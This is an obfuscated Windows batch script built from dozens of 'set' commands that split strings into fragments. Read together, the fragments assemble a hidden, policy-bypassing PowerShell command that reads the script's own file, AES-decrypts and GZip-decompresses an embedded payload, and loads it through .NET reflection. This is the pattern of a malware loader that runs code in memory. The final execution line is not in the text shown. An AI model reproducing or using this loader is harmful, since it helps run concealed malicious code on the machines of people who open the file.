@echo off
set "HJyAYgqNpI=we"
set "EEZbYnYsrq=py"
set "njlVvkuVwN=xe"
set "dHjlikwJGm=st"
set "IhnjhQtUUW=1."
set "PMhSuVBXml=Wi"
set "BzKIhiXicR= C"
set "LiAbzIpbFf=Po"
set "oxoCeksDxv=he"
set "owUCpvWbBt=:\"
set "LxIxnzzhDG=rs"
set "QkMiJAmGtJ=0\"
set "vFoRFIrpRq=nd"
set "JlqmhAeImf=\v"
set "MnYbvQgEDA=y "
set "kEpxmiJwMC=ow"
set "icXZzhNsoA=co"
set "rIlaaDNmVW=in"
set "xwEfIiVtPW=we"
set "qXRYAOsRnl=s\"
set "BXHcmEEgjl=ws"
set "nDXwzesCue=ll"
set "yDsjohMljC=ll"
set "bxOJMMrPCK=po"
set "ekdSOuaiOv=rS"
set "kyrKYDPqvn=.e"
set "lelJVyOprR=em"
set "HZVQvIhcXG=Sy"
set "USLgpCEDCX=do"
set "aGzfzJNGPq=\W"
set "NMqUkheyjg= /"
set "qAcFIlJzcD=32"
set "YHcJlMrKGH=he"
set "HcVDBIYCXu= %~dp0"
set "yScdUdKFbR=cd"
set "XsxhmHkiAW=$FUe"
set "NMBtHOTMNK=trea"
set "YAFUlamLUd=).Sp"
set "WnPVWKmaZm=ddin"
set "iQkdNvmReo=null"
set "sWRAmhtlcq=UeHH"
set "LqvBtAsHIp=oArr"
set "oKcwWnaqzL=-joi"
set "PfToesMpiX=tS46"
set "pGEScXjRVa=-Obj"
set "tJQMDjYiUm=gth)"
set "vlUJSXPnZu=ss -"
set "xsDnblCJFE=orF'"
set "ryzNXdTSdE=rt]:"
set "zQwWCxvxuI=hZtT"
set "nrZIkeEWzk=am;$"
set "lcppwDhodY= [st"
set "rPdOfZAjYv=HH.I"
set "JFiEnHFCeh=tion"
set "HJEtJoZgcR=;$mc"
set "MtyMVZqMeN=.Cre"
set "UALEBezzuC=pres"
set "OfwJzxuJWW=OyzA"
set "FXSnfVTJmT= = $"
set "vuoZWfAUGj=('%*'"
set "CQxztFZhsG=rtS4"
set "HsoJkGqzcd=m.Re"
set "jtBMNCOxRD=ion."
set "TlvsTuOgZE=rans"
set "UnCIwxLFGZ=vj0m"
set "yRpRCwvSGc=grap"
set "HnmzsACuEF=Al.T"
set "bhadAAQlFm=::De"
set "iNlNPRgGau=urit"
set "xKjAIfSkRV=raph"
set "AmJyaJFPSC=Star"
set "BuxdpNLjZk=)($e"
set "CYfYuPTvQB=oryS"
set "bllBDRamwN=ne);"
set "lymOoHNrrr=UeHH"
set "EImdVhRGCb=S, 0"
set "YdfEUzmIMW='gni"
set "RpIRfRcorL=ispo"
set "bUgNCmfPwD=stem"
set "UltLwDAELF=]::C"
set "LOFCgrNZbp=eam("
set "eIEDRsuvKy=ct S"
set "nvtVWjCJrX='dqR"
set "OeOoPTZJXb=();$"
set "cJbfqnxLrY=g = "
set "wUhLmggDqz=ach "
set "HkUknoWvdj=New-"
set "rSHbEGxjIX=sGUc"
set "hKBXBGQWFp=$xUa"
set "IqIBZiqduv=;$KW"
set "QzUUjCmGvL=1] -"
set "kedhoAxkkS=-joi"
set "XggeywfONf===')"
set "uCradhLRNM=tem."
set "wSWhFvjvkF=le  "
set "sBdlNHQOAQ=y.Pa"
set "gawnmLmrQA=ionM"
set "idkYCPrHfP=, $h"
set "CXoIniGabI=3HWs"
set "XHJSsrvTxI=gSAN"
set "ncbEIeoesk=x = "
set "LggXfpwltb=em.C"
set "mIxqSrTCwJ=)) {"
set "hfYzfWjPzs=bypa"
set "GdzgGYeSkj=3); "
set "EPFSTpGUsw=yste"
set "uvknBgeApx=in $"
set "RHOHtyJYDm=FUeH"
set "MKSVJXByKv=.Len"
set "LxmKTWfuKm=yste"
set "kCkXYcpxLj=k; }"
set "ktHnxJQqBA=ode]"
set "oxUEwCCDGC= [Sy"
set "PNOYNGHoRJ=zBZk"
set "YITpZPtYeu=UeHH"
set "GWxAPAdMhT=16] "
set "kYPuZKlsxP=sAl "
set "DTnHaEPfUV=Fina"
set "qlMgiHiLpA=::('"
set "zbiOUDbiNc=H.Pa"
set "QLuFQIJBew=-nop"
set "DwUZvWRvLm=vert"
set "hnRSQPClyt=Cevt"
set "vEaIMlDJpp=ptog"
set "ttxboslAiN=v4Ir"
set "tRlyfRxBDE=[-1."
set "BthBuPzrvH=File"
set "SVmzEGFzGI=);$x"
set "HhCVLNgyka== $F"
set "IkpChhfnMY=] -j"
set "aOvVrQGaUq=('da"
set "nSUgQTXqAL=ew-O"
set "FSwPKcJFEN=e = "
set "NsWHbBCAxa=('l0"
set "LwVXwhOCLk=cgFG"
set "zBthCxtBLy=yTo("
set "CkexjwLDMz= '')"
set "tUuMOGvCkp=aB.T"
set "sqLnwKbWjR=comp"
set "PkAMBIqDBO=[]] "
set "rtlqbtDuWG=Disp"
set "CNnbIwbrVA=ose("
set "VNwCFeTBiD=TS ="
set "xSraDhWqzw=ypto"
set "GIesJUvcri=Mode"
set "QRqfmbGJas=]::("
set "PHkRylZDSw=ct S"
set "XdSfrZNIOX=ewLi"
set "UaLEiTHtQN=evtZ"
set "oDrvnSwpIQ=ing("
set "NUzTRHUkOJ=ert]"
set "ajVheZnrek='')("
set "zfHsdYJJMW=tZ.D"
set "wgTVObjNWn=GHJz"
set "MccLPcEklj=iron"
set "ajJZhZbnXm=.Mod"
set "inwxZYqYPm=UeHH"
set "FynKQtGTQb=Obje"
set "wIPDYjAoxB=m(, "
set "cnsnmtHDbL=$Cev"
set "naiABTUXcT=();$"
set "QJUVRMdiSO=[Env"
set "cFfGhiTADh=YGhg"
set "AFITbnHrMi=;$uY"
set "ZMxshBCYuZ=New-"
set "qYcHHlhaFy='[-1"
set "CKyVSzwpDS=.Dis"
set "pXiLyHsJEX=[Sys"
set "cdmAYWZiwJ=mccJ"
set "GQjYatJXjR=n ''"
set "cqtrCwhMMu=pose"
set "mucfGXApgG=sion"
set "MTluUlsxcP='[-1"
set "GIUJUimEoK=  $e"
set "NKXdsTnZhj=UeHH"
set "uHzfQQNnZy=aB);"
set "INzjpiKohR=ose("
set "DUjyYBnSAB=O.Me"
set "yWvdswRMbl=BC;$"
set "CWCNVoOMjv=[IO."
set "FBtOtfFsxA=fore"
set "gYmLlBpicW=ddin"
set "ziqIuwXcCe=; };"
set "oKtbXdbXAA=rity"
set "qyNQdjuVgw=($GH"
set "GHSZcWxZyb=v.Su"
set "rZqhdoJPaL=ptor"
set "YOvyLvfrtx=Syst"
set "uGxKopFKcz=]::N"
set "xvoqusCFTW=.Mem"
set "LkjDjMCoxn=-4] "
set "NoXasngohR=ecry"
set "nIxgCDsSph=);$F"
set "nigwbZXNro=hZtT"
set "AYkOdQeYxG=embl"
set "ycDEkIMsOd=n ''"
set "qtFRmlitxo=Jx, "
set "yoqyjEHLVU=comm"
set "JgCnvwqWkD=se()"
set "ywIsmbkPmP=]::("
set "WTJrcqUwbJ=and "
set "ZqkxRQRwtm=gSAN"
set "LGzMUJbemQ=em.I"
set "dslphfrynj=stem"
set "fOeEdZQzQi=Comp"
set "eUFJLSypSM=($GH"
set "jwXSLGntni=form"
set "yFzidEYzKk=rofi"
set "LPeInZGrtV=.Com"
set "UPhDVKAgme=nage"
set "JHgaJoDBQW= [Sy"
set "KVsommAUka=flec"
set "nXNfZaoket=)))"
set "fBGbLCbpfe=y.En"
set "QMWHIJipda=raph"
set "rRSRABwtTi=ptog"
set "vKejMSTplm=6esa"
set "tXGuTWBukB=Syst"
set "bnMhFAuwmP=S = "
set "OnsxKzUWLC= = $"
set "OmgxaJlKVs=TllA"
set "mIYrjQZdxH=Secu"
set "sRMWkyByyf=0O+g"
set "LUxDDZvzZi=ke($"
set "pYkncbbpSx=ress"
set "UrMUMeUpIH=V = "
set "qZuDckGJKn=esaB"
set "pFXoOMMfzl=aB ="
set "miXCFQkzQO=join"
set "hbLecriOqV=ress"
set "WESkRtJbQM=.Cry"
set "LUostWVFgj=.Ass"
set "ISOhCWsGEB=yste"
set "uSTRwnJFzz=bjec"
set "rVNazKvtAw=oL'["
set "EetbwPhWll=tryP"
set "dupqNSNfTC=.GZi"
set "amYrsXCNoO==');"
set "xUkktZXJSg=brea"
set "wanEMowSTw=onve"
set "vOjzjzxxpg=PKCS"
set "ARjeCPYLMT=Fo7l"
set "gNrngUdAXP=y.Ci"
set "UAfOKQdixf=('%~f0'"
set "VWzvOJXzSA=.Sec"
set "BYpOSHReoF=:('g"
set "KdxRvSlgJc=:: '"
set "VdETcPDbka=, (,"
set "TOiBKpDSyz=+hAO"
set "ijozTlpksD=..-1"
set "fXTxTpaIQM=esFX"
set "byquWoYWSb=1..-"
set "GOCGClqtNL=ck($"
set "Tghowkoaft=m.IO"
set "RiHUrEsUJs= '')"
set "nmiaEljjmt=tem."
set "JiJOKatQMG=F'[-"
set "wDhOzxKzMf=saBm"
set "ruQVMpaycx=d;$F"
set "CHexLAKEPr=-1.."
set "wsPSUFGDvi=Conv"
set "hgVmmyEWjk=ZtTS"
set "KwVRgnKQqk=hZtT"
set "MkyATUMiaL=;$KW"
set "gpQOhumqPz=rity"
set "gbkDEgLjRN=)($h"
set "CRroORtLmT= = N"
set "vIZZpERSKJ=tem."
set "TdKzPciCcn= New"
set "FsQEBANpwj=.IO."
set "AxjjdIQGDZ=bstr"
set "RCazclvrBL=gMod"
set "jZJIyegBOe=ment"
set "KFkvjtErNz=.Dis"
set "tvfuUTOApA=Gj ="
